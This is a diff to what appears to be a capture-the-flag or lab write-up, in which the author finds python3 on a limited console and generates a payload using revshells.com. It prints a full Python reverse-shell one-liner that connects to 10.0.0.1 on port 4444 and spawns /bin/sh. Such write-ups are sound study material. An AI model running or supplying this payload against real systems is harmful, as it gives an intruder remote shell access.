@@ -98,8 +98,8 @@ when we in, we can find basic console we cant use there cat or other more specif
 
 but while searching i found there is python3
 
-with use i generate a RCE payload 
-https://www.revshells.com/
+with use https://www.revshells.com/ i generate a RCE payload 
+
 
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
